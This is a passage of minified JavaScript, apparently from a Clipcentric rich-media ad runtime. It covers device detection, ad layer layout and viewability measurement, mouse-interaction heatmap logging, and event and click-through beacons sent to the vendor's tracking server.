|nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(Ga.substr(0, 4)) ? (Z = a ? c ? 512 : 1024 : b ? c ? 128 : 256 : c ? 2048 : 4096, Ua = "p") : /android|ipad|playbook/i.test(Ga) ? (Z = a ? c ? 8 : 16 : b ? c ? 2 : 4 : c ? 32 : 64, Ua = "t") : "MacIntel" === navigator.platform && 1 < navigator.maxTouchPoints ? (b = !0, Z = c ? 2 : 4, Ua = "t") : (Z = 1, Ua = "d");
      1 !== Z && (Ua += (a ? "a" : b ? "i" : "o") + (c ? "l" : "p"));
      U = Z;
      ug = {
        256: 128,
        4096: 2048,
        32: 64,
        8: 16,
        128: 256,
        1: 1,
        16: 8,
        4: 2,
        2048: 4096,
        512: 1024,
        64: 32,
        1024: 512,
        2: 4
      }[Z];
    },
    gi = function () {
      var a;
      v.ccAnimate || (v.ccAnimate = v.requestAnimationFrame, v.ccCancel = v.cancelAnimationFrame || v.cancelRequestAnimationFrame);
      if (!v.ccAnimate) {
        var b = ["ms", "moz", "webkit", "o"];
        for (a = 0; a < b.length && !v.ccAnimate; a++) v.ccAnimate = v[b[a] + "RequestAnimationFrame"], v.ccCancel = v[b[a] + "CancelAnimationFrame"] || v[b[a] + "CancelRequestAnimationFrame"];
      }
      if (!v.ccAnimate) {
        var c = 0;
        v.ccAnimate = function (e, d) {
          var f = new Date().getTime(),
            g = Math.max(0, 16 - (f - c));
          d = v.setTimeout(function () {
            e(f + g);
          }, g);
          c = f + g;
          return d;
        };
      }
      v.ccCancel || (v.ccCancel = function (e) {
        sa(e);
      });
      lc = v.performance && v.performance.now ? v.performance : {
        now: function () {
          return Date.now();
        }
      };
    },
    Yg = function () {
      var a;
      var b = [7];
      for (a = 0; 0 >= a; a++) {
        var c = D(b[a]);
        var e = c[58];
        void 0 !== e && 1 === c[22] && O[e][0] && (c = z(b[a])[3], "VIDEO" === c.tagName && c.paused && c.play());
      }
    },
    le = function () {
      var a, b, c;
      if (!R) {
        hd = 0;
        sa($e);
        var e = Ua;
        nf();
        var d = Ua;
        var f = [2, 3, 5, 6, 19, 20, 21, 22];
        var g = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17];
        var k = S;
        S = [];
        he();
        R = !0;
        for (a = 0; 17 >= a; a++) {
          var h = g[a];
          var l = k[h];
          var m = S[h];
          if (h === m) {
            if (l !== m) {
              for (h = 0; h < f.length; h++) O[m][f[h]] = O[l][f[h]];
              hf(m);
              Zg(m);
              ca(l) === ca(m) && (pa = !0);
              0 === Ha[m] && za && !pa && (I(za.parentNode, z(m)[0], za.nextSibling), eb(za), za = z(m)[0]);
            }
            var n = !1;
            var p = c = null;
            var r = !0;
            var t = "absolute";
            var q = D(m);
            var x = D(l);
            if (b = fa[m]) {
              try {
                var w = z(m)[0];
              } catch (F) {
                w = null;
              }
              var u = b[17];
              h = q[57];
              b = null !== b[12] ? b[12] : b[10];
              if ("number" === typeof b) {
                var A = ca(S[b]);
                try {
                  var ba = 0 === Ha[A] ? 0 : 1;
                  c = z(A)[ba];
                } catch (F) {}
                u = 100 + u;
                r = w && c;
              } else /(view|page)/.test(b) ? (A = b, c = ma, p = $g(m, c), "page" !== b && (t = Ue ? "absolute" : "fixed"), u = 25E5 + u, r = !!w) : 0 === Ha[m] && (u = 4E3);
              h !== A && (n = !0, q[57] = A, w && (w.style.position = t), r && I(c, w, p));
              pa && w && (w.style.zIndex = u, ah(m));
            }
            if (O[l][0] || 0 < (x[1] & 4) || O[l][1]) {
              if ((l !== m || !r) && 0 !== Ha[l]) {
                var E = l === ua;
                Ua = e;
                va(l, 2);
                Ua = d;
              }
              if (!r) O[m][1] = !0;else if (l !== m || n) ee = !fa[l], O[m][1] = !1, Sa(m, 2), E && da(m, "fullscreenon", null, !1);
            }
            O[l][3] && l !== m && (O[l][7] && qf(l), K(l, !1), La(l));
            pa = ee = !1;
          }
        }
        bh();
        Yg();
        R = !1;
        rf(3);
        nd("layerswitch");
      }
    },
    ji = function () {
      M(self, "unload", sf);
      v.Turbolinks && M(B, "turbolinks:before-render", sf);
      We = Vb;
      zg = setInterval(si, 100);
      var a = li();
      M(B, a, ti);
      var b;
      var c = ma.scrollLeft + Va.scrollLeft;
      var e = function () {
        var f,
          g = [1, 2];
        for (f = 0; 2 > f; f++) (O[g[f]][0] || O[g[f]][3]) && Ya(g[f], !0);
      };
      M(v, "scroll", function () {
        var f = ma.scrollLeft + Va.scrollLeft;
        f !== c && (c = f, e());
      }, {
        passive: !0
      });
      try {
        var d = new MutationObserver(e);
        d.observe(ma, {
          childList: !0,
          subtree: !0
        });
        for (b = Aa && Aa.parentNode; b && "BODY" !== b.tagName;) d.observe(b, {
          attributes: !0
        }), b = b.parentElement;
        id.push(d);
      } catch (f) {}
      if (self.ReportingObserver) try {
        jd = new ReportingObserver(function (f, g) {
          ch(f);
        }, {
          types: ["intervention"],
          buffered: !0
        }), jd.observe();
      } catch (f) {}
    },
    si = function () {
      if (!Ve) {
        var a = S[0];
        var b = z(a)[0];
        a = D(a);
        var c = a[5] * a[6];
        a = -1;
        var e = 0;
        if (oa) a = oa.inViewPercentage() / 100;else if (vc || "expanded" === V) a = 1;else if (V) {
          b = tf();
          c = dh();
          var d = Math.min(b.x + b.width, c.width) - Math.max(b.x, 0);
          var f = Math.min(b.y + b.height, c.height) - Math.max(b.y, 0);
          c = b.width * b.height;
        } else {
          d = v;
          try {
            top.alert && (d = top);
          } catch (r) {}
          var g = d.innerWidth;
          var k = d.innerHeight;
          b = uf(b);
          d = Math.min(b.right, g) - Math.max(b.left, 0);
          f = Math.min(b.bottom, k) - Math.max(b.top, 0);
          var h,
            l = [3, 4, 13, 14];
          for (h = 0; h < l.length; h++) if (b = l[h], O[b] && O[b][0] && (b = ca(b), (b = (b = z(b)) && b[0]) && 0 < c)) {
            b = uf(b);
            var m = Math.min(b.right, g) - Math.max(b.left, 0);
            b = Math.min(b.bottom, k) - Math.max(b.top, 0);
            b = m * b / c;
            b > e && (e = b);
          }
        }
        0 > a && d && 0 < c && (a = d * f / c);
        d = Ka();
        try {
          var n = 242500 <= c;
        } catch (r) {
          n = !0;
        }
        Math.max(a, e) >= (n ? .3 : .5) ? !Ve && 1E3 <= d - We && (Ve = !0, na("wi")) : We = d;
      }
      try {
        var p = Fa.ownerDocument;
        if (p.contains) {
          if (p.body && p.body.contains(Fa) || p.head && p.head.contains(Fa)) return;
        } else if (Fa.parentNode) return;
      } catch (r) {
        return;
      }
      sf();
    },
    sf = function () {
      var a,
        b,
        c,
        e = [],
        d,
        f = [],
        g = [],
        k;
      jb = !1;
      if (!Kg) {
        Kg = !0;
        try {
          if (ra[1]) {
            var h = ra[0].style;
            h.position = ra[2];
            h.opacity = ra[3];
            h.zIndex = ra[4];
            h.pointerEvents = ra[5];
            h.top = ra[6];
            h.left = ra[7];
            void 0 !== ra[11] && (ra[0].parentNode.style.position = ra[11]);
          }
        } catch (T) {}
        for (h = 0; h < $b.length; h++) eb($b[h][1]);
        for (h = 0; h < id.length; h++) try {
          id[h].disconnect();
        } catch (T) {}
        $b = [];
        id = [];
        if (jd) try {
          ch(jd.takeRecords()), jd.disconnect();
        } catch (T) {}
        Vh();
        for (h = 1; 17 >= h; h++) try {
          va(h, 2);
        } catch (T) {}
        try {
          for (h = a = c = 0; h < Sd.length && a < Rd.length; h++) {
            var l = Sd[h][0];
            var m = Sd[h][1];
            var n = Rd[a][0];
            var p = Rd[a][1];
            l < n || (f[p] || (f[p] = []), f[p].push(n), g[m] || (g[m] = []), g[m].push(l), c += l - n, a++);
          }
          e.push("si");
          if (1 === U) for (e.push("dt:" + c), d = 0; d < f.length; d++) {
            var r = f[d];
            var t = g[d];
            if (r && t) {
              for (h = a = c = 0; h < t.length && a < r.length; h++) l = t[h], n = r[a], l < n || (c += l - n, a++);
              0 < c && (e.push("la:ldt:" + Oa[d] + ":" + c), n = r[0], l = t[t.length - 1], e.push("la:ldr:" + Oa[d] + ":" + (l - n)));
            }
          }
          for (b in Db) if (Db.hasOwnProperty(b) && !xg.test(b)) {
            var q = ":" + Db[b];
            0 !== b.indexOf("ld") && (q += ":" + Ge[b]);
            0 !== b.indexOf("ls") && e.push(b + q + "." + Na[b]);
          }
          na(e.join(","));
          var x = [["hm", Td], ["hc", Oe]];
          for (h = 0; 2 > h; h++) {
            var w = x[h][0];
            var u = x[h][1];
            var A = [];
            for (d = 0; d < u.length; d++) if ((k = u[d]) && 0 < k.length) {
              var ba = [];
              for (a = 0; a < k.length; a += 2) ba.push(k[a].toString(16) + "_" + k[a + 1].toString(16));
              for (; 0 < ba.length;) {
                var E = fa[d];
                A.push(E[0] + ":" + E[3] + ":" + E[4] + ":" + ba.splice(0, 10).join("_"));
              }
            }
            for (; 0 < A.length;) na(w + ":" + A.splice(0, 15).join(":"));
          }
        } catch (T) {}
        clearInterval(zg);
        a = D(7);
        clearInterval(a[32]);
        clearInterval(a[26]);
        for (h = 0; h < Hb.length; h++) try {
          q = Hb[h], fb(q[0], q[1], q[2], q[3]);
        } catch (T) {}
        Hb = [];
        Zb = [];
        gb = {};
        eb(wg);
        eb(Ye);
        eb(Ze);
        for (h = 0; h < fd.length; h++) eh(fd[h][0], fd[h][1]);
        fd = [];
        rf(2);
        zc = [];
        var F = function (T) {
          var P;
          try {
            var N = T.childNodes;
            var Q = N.length;
            for (P = Q - 1; 0 <= P; P--) F(N[P]);
          } catch (ka) {}
          try {
            eb(T);
          } catch (ka) {}
        };
        for (h = 0; 17 >= h; h++) z(h) && F(z(h)[0]);
        Ib && (eb(Ib), Ib = null);
        for (h = 0; h < Pd.length; h++) try {
          delete v[Pd[h]];
        } catch (T) {}
        Pd = [];
        Fb = [];
        ld = [];
        za = null;
      }
    },
    ch = function (a) {
      var b, c;
      for (b = 0; b < a.length; b++) (c = a[b] && a[b].body) && "HeavyAdIntervention" === c.id && na("hi");
    },
    ti = function () {
      if (yg = B.hidden || B.msHidden || B.webkitHidden) {
        if (!tc) {
          tc = !0;
          var a = Date.now();
          for (c in Wa) if (Wa.hasOwnProperty(c)) {
            var b = Wa[c];
            b.paused || (v.clearTimeout(c), b.remaining -= a - b.start, b.paused = !0);
          }
          Ud = !0;
          vf(!0);
          Ee(!0);
        }
      } else if (tc && !yg) {
        Ud = tc = !1;
        for (a in Wa) if (Wa.hasOwnProperty(a)) {
          var c = Wa[a];
          c.paused && (c.args[1] = c.remaining, delete Wa[a], delete Zc[c.index], Wg.apply(null, c.args));
        }
        vf(!1);
        Ee(!1);
      }
    },
    la = function () {
      var a = arguments,
        b = a[0],
        c = a[1],
        e = [],
        d;
      for (d = 2; d < a.length; d++) e.push(a[d]);
      return v.setTimeout(function () {
        b.apply(null, e);
      }, c);
    },
    sa = function (a) {
      v.clearTimeout(a);
      Wa[a] && (delete Zc[Wa[a].index], delete Wa[a]);
    },
    Wg = function () {
      var a = arguments,
        b = a[0],
        c = a[1],
        e = [],
        d;
      for (d = 2; d < a.length; d++) e.push(a[d]);
      b = function (f, g, k) {
        return function () {
          delete Wa[Zc[f] || 0];
          delete Zc[f];
          g.apply(null, k);
        };
      }($c, b, e);
      b = Ud ? "t" + $c : v.setTimeout(b, c);
      Wa[b] = {
        args: a,
        start: Date.now(),
        remaining: c,
        index: $c,
        paused: Ud
      };
      Zc[$c] = b;
      $c++;
      return b;
    },
    I = function (a, b, c) {
      a.insertBefore(b, c || null);
    },
    eb = function (a) {
      a && a.parentNode && a.parentNode.removeChild(a);
    },
    Dc = function (a, b, c) {
      if (a = a && a.style) void 0 !== c && (a.MozTransformOrigin = a.WebkitTransformOrigin = a.KhtmlTransformOrigin = a.OTransformOrigin = a["-ms-transform-origin"] = a.transformOrigin = c), a.MozTransform = a.WebkitTransform = a.KhtmlTransform = a.OTransform = a["-ms-transform"] = a.transform = b;
    },
    uf = function (a) {
      var b, c;
      a === za && (a = za.firstElementChild);
      var e = a.ownerDocument.defaultView;
      a = a.getBoundingClientRect();
      if (oa || V || top !== e) {
        try {
          var d = {};
          for (b in a) d[b] = a[b];
          a = d;
        } catch (h) {}
        a.origLeft = a.left;
        a.origTop = a.top;
      }
      try {
        if (V && !vc) {
          d = tf();
          var f = d.x;
          var g = d.y;
        } else if (oa) {
          var k = Ec();
          f = k.self.l;
          g = k.self.t;
        } else if (top !== e) for (f = g = 0, c = e; c !== top;) try {
          d = c.frameElement.getBoundingClientRect(), f += d.left, g += d.top, c = c.parent;
        } catch (h) {
          break;
        }
        f && (a.left += f, a.right += f);
        g && (a.top += g, a.bottom += g);
      } catch (h) {}
      return a;
    },
    Ka = function () {
      return new Date().getTime();
    },
    mb = function (a) {
      var b;
      a = a && a.replace(/\s+/g, "").toLowerCase();
      var c = Oa.length;
      for (b = 0; b < c; b++) {
        var e = decodeURIComponent(Oa[b]).replace(/\s+/g, "").toLowerCase();
        if (e === a) return S[b];
      }
      return -1;
    },
    lb = function (a) {
      var b,
        c = [];
      var e = a.length;
      var d = e % 2;
      e -= d;
      for (b = 0; b < e; b += 2) c.push(a.substr(b + 1, 1), a.substr(b, 1));
      0 < d && c.push(a.substr(e, 1));
      return c.join("");
    },
    nb = function (a, b, c) {
      var e,
        d = {};
      a = a ? a.concat() : [];
      b || (b = []);
      for (e = 0; e < a.length; e++) d[a[e]] = !0;
      for (e = 0; e < b.length; e++) d[b[e]] || a.push(b[e]);
      b = {};
      a = a ? a.concat() : [];
      c || (c = []);
      for (d = 0; d < c.length; d++) b[c[d]] = !0;
      for (d = 0; d < a.length; d++) b[a[d]] && (a.splice(d, 1), d--);
      return a;
    },
    Ob = function (a) {
      var b;
      (b = a.touches) && b.length ? a = b[0] : (b = a.changedTouches) && b.length && (a = b[0]);
      return {
        x: a.clientX,
        y: a.clientY,
        e: a
      };
    },
    z = function (a) {
      var b = fa[a];
      return b && "same" === b[8] ? Fb[Ha[a]] : Fb[a];
    },
    D = function (a) {
      var b = fa[a];
      return b && "same" === b[8] ? Yc[Ha[a]] : Yc[a];
    },
    yb = function (a) {
      var b = fa[a];
      return b && "same" === b[8] ? (b = fa[Ha[a]]) ? b[8] : "disabled" : b ? b[8] : null;
    },
    ca = function (a) {
      var b = fa[a];
      return b && "same" === b[8] ? Ha[a] : a;
    },
    he = function () {
      var a;
      for (a = 0; 17 >= a; a++) S[a] = kb[Z][a];
    },
    Rg = function (a, b) {
      var c = b ? Z : Z | ug;
      for (b = 0; 17 >= b; b++) if ((b === a || Ha[b] === a && fa[b] && "same" === fa[b][8]) && 0 < (ai[b] & c)) return !0;
      return !1;
    },
    bi = function () {
      de = !1;
      try {
        var a = Object.defineProperty({}, "passive", {
          get: function () {
            de = !0;
          }
        });
        v.addEventListener("_tp", null, a);
        v.removeEventListener("_tp", null, a);
      } catch (b) {}
    },
    M = function (a, b, c, e) {
      if (a) try {
        0 !== b.indexOf("swipe") && (de ? e || (e = !1) : e = e && e.capture ? !0 : !1, a.addEventListener(b, c, e), Hb.push([a, b, c, e]));
      } catch (d) {}
    },
    qa = function (a, b, c, e) {
      var d;
      RegExp("(mousedown|mouseover|mouseenter)", "i").test(b) ? d = "touchstart" : RegExp("(mouseup|mouseout|mouseleave|click)", "i").test(b) ? d = "touchend" : RegExp("(mousemove)", "i").test(b) && (d = "touchmove");
      if (d) {
        var f = function (k) {
          Mb || c(k);
        };
        if ("click" === b) {
          M(a, "touchstart", Rf, e);
          var g = function (k) {
            Mb = !0;
            vd || c(k);
          };
        } else g = function (k) {
          Mb = !0;
          c(k);
        };
        M(a, d, g, e);
        Zb.push([a, b, c, e].concat(Hb[Hb.length - 1]));
      } else f = c;
      M(a, b, f, e);
      Zb.push([a, b, c, e].concat(Hb[Hb.length - 1]));
    },
    fb = function (a, b, c, e) {
      try {
        de ? e || (e = !1) : e = e && e.capture ? !0 : !1, a.removeEventListener(b, c, e);
      } catch (d) {}
    },
    rf = function (a, b) {
      var c, e;
      if (c = zc[a]) for (e = 0; e < c.length; e++) if (void 0 === c[e][1] || c[e][1] === b) {
        var d = {
          type: a
        };
        void 0 !== b && (d.lid = b);
        try {
          c[e][0](d);
        } catch (f) {}
      }
    },
    Rf = function (a) {
      vd = !1;
      Xe = Ob(a);
      M(a.target, "touchmove", fh);
      M(a.target, "touchend", wf);
    },
    fh = function (a) {
      var b = Ob(a);
      10 < Math.abs(Xe.x - b.x) + Math.abs(Xe.y - b.y) && (vd = !0, wf(a));
    },
    wf = function (a) {
      fb(a.target, "touchmove", fh);
      fb(a.target, "touchend", wf);
    },
    xf = function (a, b) {
      return a && a.className ? 0 <= (" " + a.className + " ").replace(/[\t\r\n\f]/g, " ").indexOf(" " + b + " ") : !1;
    },
    eh = function (a, b) {
      var c;
      if (a && a.className && xf(a, b)) {
        var e = a.className.split(/\s+/);
        for (c = 0; c < e.length; c++) b === e[c] && (e.splice(c, 1), c--);
        a.className = e.join(" ");
      }
    },
    Za = function (a) {
      return Bc(a) ? a : Kd + a;
    },
    ui = function (a) {
      var b;
      if ((b = z(a)) && !Td[a]) {
        b = b[1];
        var c = D(a);
        var e = function (f, g) {
          return function (k) {
            g[73] = Ka();
            Rd.push([Ka(), f]);
          };
        }(a, c);
        c = function (f, g) {
          return function (k) {
            g[74] = Ka();
            Sd.push([Ka(), f]);
          };
        }(a, c);
        var d = function (f) {
          return function (g) {
            var k;
            if (k = (k = z(f)) && k[0]) try {
              var h = /(mousedown|touchstart)/.test(g.type) ? Oe[f] : Td[f];
              var l = D(f);
              if (!l[15] || 200 < g.timeStamp - l[16]) l[15] = k.getBoundingClientRect(), l[16] = g.timeStamp;
              var m = l[15];
              var n = Ob(g);
              var p = n.x - m.left;
              var r = n.y - m.top;
              var t = l[11];
              var q = l[12];
              t && 1 !== t && (p = Math.round(p / t));
              q && 1 !== q && (r = Math.round(r / q));
              h.push(p, r);
            } catch (x) {}
          };
        }(a);
        qa(b, "mouseover", e, {
          passive: !0
        });
        qa(b, "mouseout", c, {
          passive: !0
        });
        qa(b, "mousemove", d, {
          passive: !0
        });
        qa(b, "mousedown", d, {
          passive: !0
        });
        Td[a] = [];
        Oe[a] = [];
      }
    },
    ec = function (a) {
      a = a ? 0 : Ka() - Vb;
      a = "/Z=1/I=" + Tc + "/U=" + Ta + "/T=" + a + "/M=" + Eb + "/D=" + Ua;
      J && (J.publisherOverride && (a += "/PO=" + encodeURIComponent(J.publisherOverride)), J.placementOverride && (a += "/LO=" + encodeURIComponent(J.placementOverride)), J.verticalOverride && (a += "/VO=" + encodeURIComponent(J.verticalOverride)));
      return a;
    },
    na = function (a, b, c) {
      var e = [];
      var d,
        f,
        g = Ka() - Vb;
      var k = new Image();
      if (/^(si|hm|hc)/.test(a)) var h = !0;else {
        var l = a.split(",");
        for (a = 0; a < l.length; a++) {
          var m = l[a];
          "im" === m ? Na.hasOwnProperty(m) || (d = !0) : 0 === m.indexOf("cl") ? f = !0 : "ii" !== m && "hi" === m && (h = !0);
          Na.hasOwnProperty(m) ? Na[m]++ : Na[m] = 0;
          if (xg.test(m) && 0 === Na[m]) e.push(m);else if (Zh.test(m)) e.push(m + "." + Na[m]);else {
            if (0 === m.indexOf("le")) {
              var n = m.substr(2);
              var p = "ls" + n;
              n = "ld" + n;
              p = g - (Ge[p] || 0);
              Db[n] ? (p += Db[n], Na[n]++) : Na[n] = 0;
              Db[n] = p;
            } else 0 === m.indexOf("ls") && e.push(m + "." + Na[m]);
            m in Db || (Db[m] = g);
            Ge[m] = g;
          }
        }
        if (0 >= e.length) return;
        a = e.join(",");
      }
      e = "https://tr.clipcentric.com/" + (f ? "d/" : "s/") + rc + ec() + "/E=" + a;
      if (f) {
        a = "vpaid" === c;
        "$adtag_url" === b || "url" === b ? b = Wc ? Wc : "https://www.mesfire.com/request-service" : "$default_url" === b ? b = "https://www.mesfire.com/request-service" : "$vast_url" === b && (b = void 0);
        b = dc(b);
        if (V && L.open) h = L.open;else {
          h = v.open;
          var r = !0;
        }
        d = /doubleclick.*\?.*&adurl=$/.test(cb) || /bs\.serving\-sys\.com.*\?.*&rtu=$/.test(cb) || /adsrvr\.org.*\?/.test(cb) || /(\?|&|;)\w+=$/.test(cb) ? cb + encodeURIComponent(b) : cb + b;
        f = e + "/NR=1/*" + d;
        /^http/i.test(b) && !a ? (k = /tr(\.|%2e)clipcentric(\.|%2e)com/i.test(b)) ? e = b : Uc ? (navigator.sendBeacon(f, ""), e = d) : e = e + "/*" + d : (Uc ? navigator.sendBeacon(f, "") : k.src = f, cb && (Uc ? navigator.sendBeacon(d, "") : (k = new Image(), k.src = d)), e = b);
        a || (/^mailto/i.test(b) && (c = "_top"), k = h(e, c || "_blank"), !k && r && h(e, "_top"));
      } else {
        if (d) {
          if (Od) for (a = 0; a < Od.length; a++) r = new Image(), r.src = dc(Od[a]);
          if (Xc && Xc.length) if (a = za || Fa || Aa) {
            b = a.nextSibling;
            a.insertAdjacentHTML("afterend", dc(Xc.join("")));
            r = [];
            for (c = a.nextSibling; c && c !== b;) {
              if ("SCRIPT" === c.tagName) r.push(c);else for (d = c.querySelectorAll("script"), a = 0; a < d.length; a++) r.push(d[a]);
              c = c.nextSibling;
            }
            for (a = 0; a < r.length; a++) if ((d = r[a]) && "SCRIPT" === d.tagName) {
              c = B.createElement("script");
              c.text = d.innerHTML;
              for (b = 0; b < d.attributes.length; b++) c.setAttribute(d.attributes[b].name, d.attributes[b].value);
              d.parentNode.replaceChild(c, d);
            }
          } else wg = a = B.createElement("iframe"), a.scrolling = "no", a.style.cssText = "position:fixed;left:0px;top:0px;width:100%;height:100px;z-index:-1;pointer-events:none;opacity:0.0001;border-width:0px", a.srcdoc = '<!DOCTYPE html><html><style>html,body{width:100%;height:100%;margin:0;padding:0}</style><body><img style="width:100%;height:100%" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==">' + dc(Xc.join("")) + "</body></html>", I(ma, a);
        }
        h && Uc ? navigator.sendBeacon(e, "") : k.src = e;
      }
    },
    af = function () {
      var a;
      if (top !== self) if (ra[1] || oa || self.dicnf || self.inDapIF || self.inGptIF || self.isSIMID) Xa = self;else {
        var b = self.innerWidth;
        var c = self.innerHeight;
        var e = [120, 125, 160, 180, 200, 234, 250, 336, 468, 728, 970];
        320 >= b && 320 >= c ? a = !0 : 0 <= e.indexOf(b) ? a = !0 : 0 < c && 4 <= b / c && (a = !0);
        a && (Xa = self);
      }
    },
    wb = function () {
      var a = Y,
        b = ea;
      var c = v;
      var e = ma;
      var d = Va;
      var f = Ie;
      var g = top !== c;
      if (oa) try {
        var k = Ec();
        Y = k.win.w;
        ea = k.win.h;
      } catch (n) {} else if (V) {
        try {
          if ("ad_iframe" === self.frameElement.id) {
            Y = self.innerWidth;
            ea = self.innerHeight;
            var h = !0;
          }
        } catch (n) {}
        if (!h) try {
          if (L && L.getMaxSize) {
            k = dh();
            Y = k.width;
            ea = k.height;
            var l = L.getExpandProperties();
            l.width > Y && (Y = l.width);
            l.height > ea && (ea = l.height);
          } else Y = screen.width, ea = screen.height;
        } catch (n) {}
      } else g ? (Y = c.innerWidth, ea = c.innerHeight) : (k = f ? e : d, Y = k.clientWidth, ea = k.clientHeight);
      try {
        var m = top.visualViewport.scale;
      } catch (n) {}
      1 === U || g ? (Wb = m || 1, Nd = ea) : (Wb = m ? m : Y > ea ? Math.max(screen.width, screen.height) / Y : Math.min(screen.width, screen.height) / Y, 0 >= Wb && (Wb = 1), Ib || (Ib = Ca(), g = Ib.style, g.position = "absolute", g.top = "0px", g.left = "-130vw", g.width = "100vw", g.height = "100vh", g.zIndex = -1, I(e, Ib)), Nd = Math.max(ea, c.innerHeight, Ib.offsetHeight));
      return a !== Y || b !== ea;
    },
    md = function () {
      var a, b, c;
      if (Xa) {
        try {
          self.parent.alert && (a = !0);
        } catch (q) {}
        if (!a) {
          ub = Xa.innerWidth;
          vb = Xa.innerHeight;
          if (oa && xc && !Gg) {
            var e = Ec();
            ub += e.exp.l + e.exp.r;
            vb += e.exp.t + e.exp.b;
          }
          return;
        }
      } else if (V) {
        e = yf();
        0 < e.width ? ub = e.width : ub || (ub = 320);
        0 < e.height ? vb = e.height : vb || (vb = 50);
        return;
      }
      a = Xa ? Xa.frameElement.parentElement : za ? za.parentNode : Aa.parentNode;
      var d = c = 5;
      try {
        var f = v.getComputedStyle(a);
        var g = f.lineHeight;
        var k = parseFloat(f.fontSize);
        var h = b = 0;
        h = "normal" === g ? 1.2 * k : /px/.test(g) ? parseFloat(g) : /%/.test(g) ? parseFloat(g) * k / 100 : parseFloat(g) * k;
        isNaN(h) || (d = Math.ceil(Math.max(d, h)) + 5);
        h = Math.ceil(parseFloat(f.paddingTop) + parseFloat(f.paddingBottom));
        isNaN(h) || (d += h);
        b = Math.ceil(parseFloat(f.paddingLeft) + parseFloat(f.paddingRight));
        isNaN(b) || (c += b);
      } catch (q) {}
      if (za) if (e = za.style, 0 < (U & 390) && 11 > ob) {
        var l = !0;
        var m = e.width;
        var n = e.height;
        var p = e.padding;
        e.width = e.height = e.padding = "0px";
      } else {
        var r = e.position;
        e.position = "absolute";
      }
      for (h = b = 0; a;) try {
        f = v.getComputedStyle(a);
        h < c && /\d+px$/.test(f.width) && (h = parseInt(f.width));
        b < d && /\d+px$/.test(f.height) && (b = parseInt(f.height));
        if ("none" === f.display) {
          la(ff, 50, 0, 0);
          var t = !0;
          break;
        }
        if (h < c || b < d) a = a.parentElement;else break;
      } catch (q) {
        break;
      }
      e && (l ? (e.width = m, e.height = n, e.padding = p) : e.position = r);
      if (0 >= h || t) Xa && Xa.innerWidth ? (h = Xa.innerWidth, b = Xa.innerHeight) : (a = Fa.parentElement, f = v.getComputedStyle(a), /\d+px$/.test(f.width) && /\d+px$/.test(f.height) || (f = a.getBoundingClientRect()), h = Math.max(parseInt(f.width), 120), b = Math.max(parseInt(f.height), 50));
      ub = h;
      vb = b;
    },
    bh = function () {
      var a;
      for (a = 0; 17 >= a; a++) O[a][0] && fa[a] && (a === ua ? ne() : Ya(a, !0));
      fc();
    },
    xb = function (a) {
      var b;
      if (!gd && jb) {
        gd = !0;
        var c = (b = top !== v) || Wd > Xd ? 2 : 1;
        wb();
        Wd === Y && Xd === ea && a && "resize" === a.type || (md(), a = b || Y > ea ? 2 : 1, c !== a && 1 !== U ? (hd++, 2 <= hd ? le() : $e = la(ef, 500)) : le());
        Wd = Y;
        Xd = ea;
        sa(Vd);
        Vd = la(Tg, 1);
      }
    },
    Tg = function () {
      gd = !1;
    },
    ff = function (a, b) {
      wb();
      a !== Y && xb();
      12 > b && (sa(Bg), Bg = la(ff, 100, Y, b + 1));
    },
    oe,
    gh,
    vi = function () {
      var a = v.innerWidth;
      a !== oe && (xb(), oe = a);
    },
    hi = function () {
      oe || (oe = v.innerWidth);
      sa(gh);
      gh = la(vi, 100);
    },
    ef = function () {
      hd++;
      2 <= hd ? le() : $e = la(xb, 500, {
        type: "resize"
      });
    },
    K = function (a, b) {
      if ("number" === typeof a) {
        a = (a = z(a)) && a[0];
        if (!a) return;
        a = a.style;
      } else if (a) a = a.style;else return;
      a.display = b ? "block" : "none";
    },
    Ca = function (a) {
      a = B.createElement(a || "div");
      var b = a.style;
      a.draggable = !1;
      a.ondragstart = function () {
        return !1;
      };
      b.display = "block";
      b.padding = "0px";
      b.margin = "0px";
      b.borderWidth = "0px";
      b.minWidth = "0px";
      b.minHeight = "0px";
      b.maxWidth = "none";
      b.maxHeight = "none";
      b.WebkitTapHighlightColor = "rgba(0,0,0,0)";
      b.WebkitUserSelect = "none";
      b.MozUserSelect = "none";
      b.MsUserSelect = "none";
      b.userSelect = "none";
      b.boxSizing = "content-box";
      return a;
    },
    $g = function (a, b) {
      var c = b.firstChild;
      for (a += 1; 17 >= a; a++) if (fa[a] && fa[a][11] && Fb[a] && Fb[a][0] && Fb[a][0].parentNode === b) {
        c = Fb[a][0].nextSibling;
        break;
      }
      return c;
    },
    ah = function (a) {
      var b = (z(a)[0] || {}).style || {};
      1 !== Z && (3 === a || 4 === a ? (b.borderTop = "2px solid black", b.marginTop = "-2px") : (b.borderTopWidth = "0px", b.marginTop = "0px"), 3 === a || 4 === a ? (b.borderLeft = "2px solid black", b.marginLeft = "-2px") : (b.borderLeftWidth = "0px", b.marginLeft = "0px"), 3 === a || 4 === a ? (b.borderRight = "2px solid black", b.marginRight = "-2px") : (b.borderRightWidth = "0px", b.marginRight = "0px"));
    },
    hf = function (a) {
      var b;
      if ((!bb || a === S[a]) && fa[a]) {
        var c = D(a);
        if (!c[0]) {
          c[0] = !0;
          c[58] = a;
          var e = yb(a);
          var d = ca(a);
          var f = O[a];
          var g = fa[a];
          var k = fa[d];
          var h = g[17];
          var l = k[3];
          var m = k[4];
          var n = Za(k[9]);
          k = Fb[d] = [];
          k[0] = b = Ca();
          var p = b.style;
          p.width = l + "px";
          p.height = m + "px";
          k[1] = l = b.cloneNode(!1);
          var r = l.style;
          r.position = "absolute";
          r.left = r.top = "0px";
          I(b, l);
          var t = null !== g[12] ? g[12] : g[10];
          if ("number" === typeof t) {
            t = S[t];
            var q = (m = 0 === Ha[t]) ? 0 : 1;
          }
          m = 0 === Ha[a];
          ah(a);
